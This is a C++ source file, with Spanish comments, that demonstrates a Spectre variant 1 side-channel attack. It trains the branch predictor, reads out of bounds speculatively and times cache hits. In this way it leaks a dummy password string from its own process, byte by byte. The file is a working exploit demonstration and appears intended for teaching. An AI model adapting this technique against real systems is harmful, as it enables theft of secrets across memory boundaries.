#include <algorithm>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <emmintrin.h>
#include <iostream>
#include <limits>
#include <memory>
#include <vector>
#include <x86intrin.h>

using namespace std;
uint64_t time1, time2;
uint32_t junk;
#define READ_LATENCY_THRESHOLD 80

const char *public_data = "Hello, World";
const char *private_data = "my password is 123adminABC";

void ForceRead(const void *p) {
  (void)*reinterpret_cast<const volatile char *>(p);
}

// Funcion para leer latencia, pero esta definida en assembly
// extern "C" uint64_t MeasureReadLatency(const void *address);
// Funcion para leer latencia, pero esta definida en assembly
uint64_t MeasureReadLatency(const void *address) {
  _mm_mfence();
  _mm_lfence();
  time1 = __rdtscp(&junk);
  _mm_lfence();
  ForceRead(address);
  _mm_lfence();
  time2 = __rdtscp(&junk);
  return time2 - time1;
}

inline void FlushDataCacheLineNoBarrier(const void *address) {
  _mm_clflush(address);
}

inline void MemoryAndSpeculationBarrier() {
  // See docs/fencing.md
  _mm_mfence();
  _mm_lfence();
}

inline void FlushDataCacheLine(void *address) {
  FlushDataCacheLineNoBarrier(address);
  MemoryAndSpeculationBarrier();
}

constexpr size_t kCacheLineBytes = 64;
constexpr size_t kPageBytes = 4 * 1024;

class TimingArray {
public:
  // Alias para los tipos de los elementos del array.
  using ValueType = int;

  // Hacer el array mas pequeño, no hace que mejore el bandwidth del
  // side-channel. Y tratar de filtrar mas de un byte a la vez incrementa
  // significativamente el ruido debido a un mayor cache contention.
  //
  // "Real" elementos porque se aumentan elementos buffer antes y despues.
  // Mirar comentario en `elements_` abajo.
  //
  // Cache contention ocurre cuando 2 o mas CPUs alternadamente y repetidamente
  // actualizan la misma cache line.
  static const size_t kRealElements = 256;

  TimingArray() {
    // Explicitamente inicializar los elementos del array
    //
    // No es importante que valor se escribe mientras se fuerze que *algo* sea
    // escrito a cada elemento. De otra forma,
    //
    // No es importante el valor que escribamos siempre que forcemos escribir
    // algo en cada elemento. De lo contrario, la asignación de respaldo podría
    // ser un rango de páginas de zero-fill-on-demand(ZFOD), de copy-on-write
    // que todas comienzan mapeadas a la misma página física de ceros. Dado que
    // la caché en las CPUs modernas de Intel está etiquetada físicamente,
    // algunos elementos podrían asignarse a la misma línea de caché y no
    // observaríamos una diferencia de tiempo entre la lectura de elementos
    // accedidos y no accedidos.
    for (int i = 0; i < size(); ++i) {
      ElementAt(i) = -1;
    }

    // Inicializar el threshold la primera ves, luego lo guardamos para las
    // siguientes instancias
    // static uint64_t threshold = FindCachedReadLatencyThreshold();
    // cached_read_latency_threshold_ = threshold;
    cached_read_latency_threshold_ = READ_LATENCY_THRESHOLD;
  }

  TimingArray(TimingArray &) = delete;
  TimingArray &operator=(TimingArray &) = delete;

  ValueType &operator[](size_t i) {
    // Mapear indice a elemento.
    //
    // Como se menciona en el comentario en la clase, nosotros tratamos de
    // frustrar el prefetch por hardware aplicacando de una permutacion para que
    // los elementos no aparecen en memoria en el orden del indice. Lo hacemos
    // mediante el uso de un Linear Congruential Generator (LCG). Donde el
    // tamaño del array es el modulo.
    // Para garantizar que esto sea una permutacion, tenemos que seguir los
    // requisitos descritos en:
    //
    // https://en.wikipedia.org/wiki/Linear_congruential_generator#c_%E2%89%A0_0
    //
    // En este caso, 113 es una buena opcion:
    // 113 es primo.
    // 113-1 es divisible por el unico factor primo de 256, (2).
    // Ambos son divisibles por 4.
    // Si el array tuviera un tamaño dinámico, no podríamos codificar 113, y
    // sería difícil producir un buen multiplicador. Puede ser deseable, en
    // cambio, cambiar a un PRNG diferente que también soporte períodos pequeños
    // y una búsqueda eficiente. (Por ejemplo, un generador congruente
    // permutado).
    //
    static_assert(kRealElements == 256, "consider changing 113");
    size_t el = (100 + i * 113) % kRealElements;

    // Añadir 1 para omitir el primer elemento del buffer.
    return elements_[1 + el].cache_lines[0].value;
  }

  size_t size() const { return kRealElements; }

  // Borra todos los elementos del array de la cache.
  void FlushFromCache() {
    // We only need to flush the cache lines with elements on them.
    for (int i = 0; i < size(); ++i) {
      FlushDataCacheLineNoBarrier(&ElementAt(i));
    }

    // Esperar a que termine la operacion flush
    MemoryAndSpeculationBarrier();
  }

  // Devuelve el índice del primer elemento "rápido" despues de 'start_after', o
  // -1 si ningún elemento fue obviamente leído desde la caché.
  //
  // Igual que `FindFirstCachedElementIndex`, excepto que comienza justo
  // *después* del índice `start_after`, envolviendo para probar todos los
  // elementos del array. Es decir, el primer elemento leído es `(start_after+1)
  // % size` y el último elemento leído antes de devolver -1 es `start_after`.
  int FindFirstCachedElementIndexAfter(int start_after) {
    // Falla si el elemento esta fuera de limites.
    if (start_after >= size()) {
      return -1;
    }

    // Comienza en el elemento después de `start_after`, recorremos hasta que
    // hayamos encontrado un elemento en caché o hayamos probado todos los
    // elementos.
    for (int i = 1; i <= size(); ++i) {
      int el = (start_after + i) % size();
      uint64_t read_latency = MeasureReadLatency(&ElementAt(el));
      if (read_latency <= cached_read_latency_threshold_) {
        return el;
      }
    }

    // No se encontro un elemento cache.
    return -1;
  }

private:
  // Para no tener (*this)[i] en todas partes.
  ValueType &ElementAt(size_t i) { return (*this)[i]; }

  uint64_t cached_read_latency_threshold_;
  // uint64_t FindCachedReadLatencyThreshold() {

  // const int iterations = 1000;
  // const int percentile = 10;

  //// Accumula la latencia mas alta vista en cada iteracion.
  // vector<uint64_t> max_read_latencies;

  // for (int n = 0; n < iterations; ++n) {
  //// Cargar todos los elementos a cache.
  // for (int i = 0; i < size(); ++i) {
  // ForceRead(&ElementAt(i));
  //}

  //// Lee cada elemento y lleva cuenta sobre las lecturas mas lentas.
  // uint64_t max_read_latency = numeric_limits<uint64_t>::min();
  // for (int i = 0; i < size(); ++i) {
  // max_read_latency =
  // max(max_read_latency, MeasureReadLatency(&ElementAt(i)));
  //}

  // max_read_latencies.push_back(max_read_latency);
  //}

  //// Encuntra y retorna el valor del percentil con la mayor latencia leida
  // sort(max_read_latencies.begin(), max_read_latencies.end());
  // int index = (percentile / 100.0) * (max_read_latencies.size() - 1);
  // return max_read_latencies[index];
  //}

  // Define un struct que ocupa una linea de cache completa. Algunos
  // compiladores pueden no soportar la alineación en `kCacheLineBytes`, que
  // casi siempre es mayor que `sizeof(max_align_t)`. En esos casos obtendremos
  // un error de compilación. Ver:
  // https://timsong-cpp.github.io/cppwp/n3337/basic.align#9
  struct alignas(kCacheLineBytes) CacheLine {
    ValueType value;
  };
  static_assert(sizeof(CacheLine) == kCacheLineBytes, "");

  // Definir struct "Element", que ocupa una página más una línea
  // de caché. Cuando asignamos una array de estos, sabemos que los elementos
  // adyacentes comenzarán en diferentes páginas y en diferentes conjuntos de
  // caché.
  static const int kCacheLinesPerPage = kPageBytes / kCacheLineBytes;
  struct Element {
    array<CacheLine, kCacheLinesPerPage + 1> cache_lines;
  };
  static_assert(sizeof(Element) == kPageBytes + kCacheLineBytes, "");

  // El almacén de respaldo real para la matriz de sincronización, con elementos
  // de búfer antes y después para evitar la interferencia de las asignaciones
  // adyacentes del montón.
  //
  // We use `vector` here instead of `array` to avoid problems where
  // `TimingArray` is put on the stack and the class is so large it skips past
  // the stack guard page. This is more likely on PowerPC where the page size
  // (and therefore our element stride) is 64K.
  vector<Element> elements_{1 + kRealElements + 1};
};

// filtra byte que se encuentra fisicamente en &text[0]+offset
// sin si quiera cargarlo. En la "abstract machine", y en el codigo ejecutado
// por el CPU, esta funcion no carga ninguna memoria a excepcion de la que se
// encuentra dentro de los limites de 'text' y data auxiliar local
//
// En lugar, la filtracion se produce  mediante accesos fuera de limites
// durante speculative execution, pasando por alto la comprobacion de limites.
// Para eso se tiene que entrenar el branch predictor a que piense que el valor
// va estar dentro del rango.
static char LeakByte(const char *data, size_t offset) {
  TimingArray timing_array;
  // size necesita ser retirado de cache para poder forzar speculative
  // execution para poder adivinar el resultado.
  unique_ptr<size_t> size_in_heap =
      unique_ptr<size_t>(new size_t(strlen(data)));

  for (int run = 0;; ++run) {
    timing_array.FlushFromCache();
    // un offset diferent cada vez para garantizar que el valor un acceso
    // in-bounds sea diferente del valor secreto que queremos filtrar mediante
    // acceso out-of-bounds speculativo
    int safe_offset = run % strlen(data);

    // longitud del loop debe ser lo suficientemente largo para superar a los
    // branch predictors
    for (size_t i = 0; i < 2048; ++i) {
      // remover de cache
      FlushDataCacheLine(size_in_heap.get());

      // train branch predictor:
      // 2047 accesos in-bounds
      // luego en el acceso 2048, es out-of-bounds con el offset.
      //
      // El computo del valor del local_offset es branchless
      // y es equivalente a:
      // size_t local_offoset = ((i+1) % 2048) ? safe_offset : offset;
      // primer valor es 1 hasta 2046 y luego en 2047 es 0
      // usa safe_offset 2047 veces y al final usa "offset"
      size_t local_offset =
          offset + (safe_offset - offset) * bool((i + 1) % 2048);
      //        ^                    ^ se cancela 2047 con unos y al final un 0
      //                               hace que utilice offset

      if (local_offset < *size_in_heap) {
        // esta ramificacion ha sido entrenada para que se tome durante
        // speculative execution, y es tomada en la itaracion 2048
        // MemoryAndSpeculationBarrier();
        ForceRead(&timing_array[data[local_offset]]);
      }
    }
    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
    if (ret >= 0 && ret != data[safe_offset])
      return ret;
    if (run > 10000) {
      cerr << "Does not converge" << endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  // const size_t private_offset = private_data - public_data;
  const size_t private_offset = strlen(public_data) + 1;
  cout << "\nprivate offset: " << private_offset << '\n';
  cout << "public addr: " << (void *)public_data << '\n';
  cout << "private addr: " << (void *)private_data << '\n';
  cout << "Leaking the string: ";
  cout.flush();
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // for (size_t i = 0; i < 1000; ++i) {
    cout << LeakByte(public_data, private_offset + i);
    cout.flush();
  }
  cout << "\n";
  exit(EXIT_SUCCESS);
}
